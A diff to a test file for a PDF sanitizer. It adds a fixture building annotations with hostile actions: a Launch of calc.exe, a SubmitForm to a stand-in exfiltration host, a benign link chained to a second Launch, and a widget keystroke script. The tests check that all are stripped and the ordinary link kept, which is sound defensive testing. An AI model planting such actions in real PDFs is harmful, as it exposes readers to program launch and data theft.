@@ -130,6 +130,7 @@ describe('active-content stripping', () => {
       documentJavaScript: true,
       catalogActions: true,
       pageActions: 1,
+      annotationActions: 0,
     })
   })
 
@@ -141,6 +142,7 @@ describe('active-content stripping', () => {
       documentJavaScript: false,
       catalogActions: false,
       pageActions: 0,
+      annotationActions: 0,
     })
   })
 
@@ -174,5 +176,162 @@ describe('active-content stripping', () => {
 
   it('works on a document with no catalog extras at all', () => {
     expect(() => replay(new Map([[SRC, clean()]]), edited())).not.toThrow()
+  })
+})
+
+/**
+ * A page whose annotations carry the payload -- and one ordinary link that
+ * must survive.
+ *
+ * Separate from `hostile()` on purpose. The catalog vectors it carries
+ * would defeat the pass-through tier by themselves, which would hide
+ * whether the annotation sweep did any work; this fixture's ONLY payload
+ * is on annotations, so the pass-through assertion below means something.
+ */
+function hostileAnnots(): Uint8Array {
+  const doc = mupdf.PDFDocument.openDocument(clean(), 'application/pdf') as mupdf.PDFDocument
+  const page = doc.loadPage(0)
+
+  const action = (put: (d: mupdf.PDFObject) => void): mupdf.PDFObject => {
+    const a = doc.newDictionary()
+    put(a)
+    return doc.addObject(a)
+  }
+  const link = (a: mupdf.PDFObject): mupdf.PDFObject => {
+    const annot = doc.newDictionary()
+    annot.put('Type', doc.newName('Annot'))
+    annot.put('Subtype', doc.newName('Link'))
+    const rect = doc.newArray()
+    for (const n of [50, 50, 150, 90]) rect.push(n)
+    annot.put('Rect', rect)
+    annot.put('A', a)
+    return doc.addObject(annot)
+  }
+
+  const annots = doc.newArray()
+  annots.push(link(action((a) => {
+    a.put('S', doc.newName('Launch'))
+    a.put('F', doc.newString('calc.exe'))
+  })))
+  annots.push(link(action((a) => {
+    a.put('S', doc.newName('SubmitForm'))
+    a.put('F', doc.newString('https://exfiltrate.example/collect'))
+  })))
+  // Benign, and the whole reason this is a denylist: it must come back out.
+  annots.push(link(action((a) => {
+    a.put('S', doc.newName('URI'))
+    a.put('URI', doc.newString('https://keep-me.example/'))
+  })))
+  // Benign first hop, forbidden second -- judging by /S alone passes this.
+  annots.push(link(action((a) => {
+    a.put('S', doc.newName('URI'))
+    a.put('URI', doc.newString('https://decoy.example/'))
+    a.put('Next', action((n) => {
+      n.put('S', doc.newName('Launch'))
+      n.put('F', doc.newString('chained.exe'))
+    }))
+  })))
+  // A form widget with a keystroke script: not an editable annotation, so
+  // it is only reachable by reading /Annots directly.
+  const widget = doc.newDictionary()
+  widget.put('Type', doc.newName('Annot'))
+  widget.put('Subtype', doc.newName('Widget'))
+  const wrect = doc.newArray()
+  for (const n of [50, 120, 150, 160]) wrect.push(n)
+  widget.put('Rect', wrect)
+  widget.put('AA', action((aa) => aa.put('K', action((k) => {
+    k.put('S', doc.newName('JavaScript'))
+    k.put('JS', doc.newString('app.alert("keystroke")'))
+  }))))
+  annots.push(doc.addObject(widget))
+
+  page.getObject().put('Annots', annots)
+  page.destroy()
+  const out = doc.saveToBuffer('compress,garbage=compact').asUint8Array()
+  doc.destroy()
+  return out
+}
+
+/** The /S names still present on page 0's annotation actions. */
+function annotActionKinds(bytes: Uint8Array): string[] {
+  const d = mupdf.PDFDocument.openDocument(bytes, 'application/pdf') as mupdf.PDFDocument
+  const page = d.loadPage(0)
+  const kinds: string[] = []
+  try {
+    const annots = page.getObject().get('Annots')
+    annots.forEach((annot) => {
+      const a = annot.get('A')
+      if (a.isDictionary()) kinds.push(a.get('S').asName())
+      if (!annot.get('AA').isNull()) kinds.push('AA')
+    })
+  } finally {
+    page.destroy()
+    d.destroy()
+  }
+  return kinds
+}
+
+describe('annotation-level actions', () => {
+  it('the fixture really carries them', () => {
+    expect(annotActionKinds(hostileAnnots()).sort()).toEqual(
+      ['AA', 'Launch', 'SubmitForm', 'URI', 'URI'].sort(),
+    )
+  })
+
+  it('removes Launch, SubmitForm, and widget keystroke scripts', () => {
+    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
+    const kinds = annotActionKinds(out)
+    expect(kinds).not.toContain('Launch')
+    expect(kinds).not.toContain('SubmitForm')
+    expect(kinds).not.toContain('AA')
+  })
+
+  it('keeps an ordinary URI link', () => {
+    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
+    expect(annotActionKinds(out)).toContain('URI')
+    expect(Buffer.from(out).includes('keep-me.example')).toBe(true)
+  })
+
+  // The reason chainIsForbidden walks /Next at all.
+  it('removes a forbidden action hidden behind a benign one', () => {
+    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
+    expect(Buffer.from(out).includes('chained.exe')).toBe(false)
+    expect(Buffer.from(out).includes('decoy.example')).toBe(false)
+  })
+
+  it('removes the payload text, not just the reference', () => {
+    const out = replay(new Map([[SRC, hostileAnnots()]]), edited())
+    for (const needle of ['calc.exe', 'exfiltrate.example', 'keystroke']) {
+      expect(Buffer.from(out).includes(needle)).toBe(false)
+    }
+  })
+
+  it('counts each changed annotation once, however many keys it lost', () => {
+    let found: { annotationActions: number } | undefined
+    replay(new Map([[SRC, hostileAnnots()]]), edited(), {
+      onStripped: (f) => { found = f },
+    })
+    // Launch, SubmitForm, the chained link, and the widget: four of the
+    // five annotations changed, and the URI link is the one left alone.
+    expect(found?.annotationActions).toBe(4)
+  })
+
+  /**
+   * THE POINT OF THE WHOLE TASK. Before the annotation sweep existed, this
+   * file reported "nothing stripped" and therefore qualified for the
+   * byte-identical pass-through tier -- the export handed the user's
+   * hostile file straight back, unchanged and unmentioned.
+   */
+  it('defeats pass-through for a file whose only payload is on annotations', () => {
+    const input = hostileAnnots()
+    const out = replay(new Map([[SRC, input]]), untouched())
+    expect(Buffer.from(out).equals(Buffer.from(input))).toBe(false)
+    expect(Buffer.from(out).includes('calc.exe')).toBe(false)
+  })
+
+  it('still hands back a clean file byte for byte', () => {
+    const input = clean()
+    const out = replay(new Map([[SRC, input]]), untouched())
+    expect(Buffer.from(out).equals(Buffer.from(input))).toBe(true)
   })
 })
